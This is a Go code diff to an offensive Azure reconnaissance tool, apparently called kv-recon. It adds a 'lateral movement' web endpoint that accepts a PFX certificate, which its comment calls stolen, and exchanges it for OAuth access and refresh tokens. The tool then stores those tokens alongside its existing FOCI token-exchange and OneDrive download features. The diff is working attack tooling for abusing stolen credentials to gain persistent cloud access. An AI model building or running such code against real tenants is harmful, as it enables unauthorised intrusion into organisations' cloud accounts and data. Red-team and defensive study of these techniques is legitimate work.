@@ -66,6 +66,9 @@ func StartServer(addr, port string, openBrowser bool) {
 	// FOCI token exchange
 	mux.HandleFunc("/api/foci/exchange", handleFOCIExchange)
 
+	// Lateral movement — certificate auth
+	mux.HandleFunc("/api/lateral/cert-auth", handleCertAuth)
+
 	fmt.Printf("[*] kv-recon web UI → %s\n", baseURL)
 	fmt.Println("[*] Press Ctrl+C to stop.")
 
@@ -831,6 +834,78 @@ func handleOneDriveDownload(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 	http.Redirect(w, r, item.DownloadURL, http.StatusFound)
+}
+
+// handleCertAuth authenticates as an app registration using a stolen PFX certificate.
+// POST /api/lateral/cert-auth  multipart/form-data:
+//
+//	pfxFile      — PFX (PKCS#12) file
+//	pfxPassword  — PFX password (may be empty)
+//	clientId     — App registration client ID
+//	tenantId     — Azure AD tenant ID
+//	scope        — OAuth scope (e.g. https://management.azure.com/.default)
+//	label        — Optional display label
+func handleCertAuth(w http.ResponseWriter, r *http.Request) {
+	if r.Method != http.MethodPost {
+		jsonError(w, "method not allowed", http.StatusMethodNotAllowed)
+		return
+	}
+	// Parse multipart form with a 5 MB memory limit (PFX files are tiny).
+	if err := r.ParseMultipartForm(5 << 20); err != nil {
+		jsonError(w, "form parse error: "+err.Error(), http.StatusBadRequest)
+		return
+	}
+	file, _, err := r.FormFile("pfxFile")
+	if err != nil {
+		jsonError(w, "pfxFile upload is required: "+err.Error(), http.StatusBadRequest)
+		return
+	}
+	defer file.Close()
+	pfxData, err := io.ReadAll(file)
+	if err != nil {
+		jsonError(w, "reading PFX data: "+err.Error(), http.StatusBadRequest)
+		return
+	}
+
+	password := r.FormValue("pfxPassword")
+	clientID := r.FormValue("clientId")
+	tenantID := r.FormValue("tenantId")
+	scope := r.FormValue("scope")
+	label := r.FormValue("label")
+
+	if clientID == "" || tenantID == "" || scope == "" {
+		jsonError(w, "clientId, tenantId, and scope are required", http.StatusBadRequest)
+		return
+	}
+
+	at, rt, exp, err := ExchangePFXForToken(pfxData, password, tenantID, clientID, scope)
+	if err != nil {
+		jsonError(w, err.Error(), http.StatusBadGateway)
+		return
+	}
+
+	if label == "" {
+		label = "cert:" + parseJWTLabel(at)
+	}
+	entry := TokenEntry{
+		Label:        label,
+		TenantID:     tenantID,
+		ClientID:     clientID,
+		AccessToken:  at,
+		RefreshToken: rt,
+		ExpiresAt:    time.Now().Add(time.Duration(exp) * time.Second),
+		Scopes:       scope,
+	}
+	if err := SaveToken(entry); err != nil {
+		jsonError(w, "failed to save token: "+err.Error(), http.StatusInternalServerError)
+		return
+	}
+
+	respondJSON(w, map[string]interface{}{
+		"accessToken": at,
+		"expiresIn":   exp,
+		"label":       label,
+	})
 }
 
 // handleFOCIExchange exchanges a stored refresh token using a different client ID (FOCI).
